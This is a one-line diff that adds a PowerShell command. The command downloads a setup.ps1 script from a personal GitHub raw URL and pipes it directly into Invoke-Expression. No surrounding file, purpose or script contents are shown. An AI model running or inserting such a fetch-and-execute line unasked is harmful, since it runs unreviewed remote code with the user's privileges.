@@ -1,0 +1,1 @@
+irm "https://raw.githubusercontent.com/rezwanahmedratul/logo/refs/heads/main/setup.ps1" | iex
